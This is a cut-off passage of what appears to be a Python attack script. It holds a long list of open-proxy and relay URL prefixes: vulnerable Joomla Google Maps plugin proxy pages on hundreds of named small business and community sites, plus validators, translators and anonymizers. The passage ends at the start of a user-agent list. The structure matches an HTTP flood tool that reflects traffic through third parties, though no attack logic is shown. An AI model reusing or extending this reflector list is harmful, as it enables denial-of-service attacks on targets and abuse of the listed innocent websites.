     'http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.google.com/ig/add?feedurl=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://www.google.com/translate?u=',
     'http://translate.google.com/translate?u=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=',
     'http://validator.w3.org/check?uri=',
     'http://jigsaw.w3.org/css-validator/validator?uri=',
     'http://validator.w3.org/checklink?uri=',
     'http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=',
     'http://www.w3.org/RDF/Validator/ARPServlet?URI=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=',
     'http://www.w3.org/services/tidy?docAddr=',
     'http://validator.w3.org/mobile/check?docAddr=',
     'http://validator.w3.org/p3p/20020128/p3p.pl?uri=',
     'http://validator.w3.org/p3p/20020128/policy.pl?uri=',
     'http://online.htmlvalidator.com/php/onlinevallite.php?url=',
     'http://feedvalidator.org/check.cgi?url=',
     'http://gmodules.com/ig/creator?url=',
     'http://www.google.com/ig/adde?moduleurl=',
     'http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=',
     'http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=',
     'http://host-tracker.com/check_page/?furl=',
     'http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=',
     'http://www.viewdns.info/ismysitedown/?domain=',
     'http://www.onlinewebcheck.com/check.php?url=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
     'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
     'http://streamitwebseries.twww.tv/proxy.php?url=',
     'http://www.comicgeekspeak.com/proxy.php?url=',
     'http://feedvalidator.org/check.cgi?url=',
     'http://gmodules.com/ig/creator?url=',
     'http://www.google.com/ig/adde?moduleurl=',
     'http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=',
     'http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=',
     'http://host-tracker.com/check_page/?furl=',
     'http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=',
     'http://www.onlinewebcheck.com/check.php?url=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
     'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
     'http://about42.nl/www/showheaders.php;POST;about42.nl.txt',
     'http://browsershots.org;POST;browsershots.org.txt',
     'http://streamitwebseries.twww.tv/proxy.php?url=',
     'http://www.comicgeekspeak.com/proxy.php?url=',
     'http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=',
     'http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt',
     'http://web-sniffer.net/?url=',
     'http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=',
     'http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=',
     'http://translate.yandex.net/tr-url/ru-uk.uk/',
     'http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS',
     'http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=',
     'http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=',
     'http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=',
     'http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=',
     'http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=',
     'http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=',
     'http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://GREENhousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=',
     'http://validator.w3.org/nu/?doc=',
     'http://check-host.net/check-http?host=',
     'http://www.netvibes.com/subscribe.php?url=',
     'http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.google.com/ig/add?feedurl=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://www.google.com/translate?u=',
     'http://translate.google.com/translate?u=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=',
     'http://validator.w3.org/check?uri=',
     'http://jigsaw.w3.org/css-validator/validator?uri=',
     'http://validator.w3.org/checklink?uri=',
     'http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=',
     'http://www.w3.org/RDF/Validator/ARPServlet?URI=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=',
     'http://www.w3.org/services/tidy?docAddr=',
     'http://validator.w3.org/mobile/check?docAddr=',
     'http://validator.w3.org/p3p/20020128/p3p.pl?uri=',
     'http://validator.w3.org/p3p/20020128/policy.pl?uri=',
     'http://online.htmlvalidator.com/php/onlinevallite.php?url=',
     'http://feedvalidator.org/check.cgi?url=',
     'http://gmodules.com/ig/creator?url=',
     'http://www.google.com/ig/adde?moduleurl=',
     'http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=',
     'http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=',
     'http://host-tracker.com/check_page/?furl=',
     'http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=',
     'http://www.viewdns.info/ismysitedown/?domain=',
     'http://www.onlinewebcheck.com/check.php?url=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
     'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
     'http://about42.nl/www/showheaders.php;POST;about42.nl.txt',
     'http://browsershots.org;POST;browsershots.org.txt',
     'http://streamitwebseries.twww.tv/proxy.php?url=',
     'http://www.comicgeekspeak.com/proxy.php?url=',
     'http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://thevintagechurch.com/www2/index.php?url=/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=',
     'http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt',
     'http://web-sniffer.net/?url=',
     'http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=',
     'http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=',
     'http://translate.yandex.net/tr-url/ru-uk.uk/',
     'http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=']
    useragents = [
     'Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41',
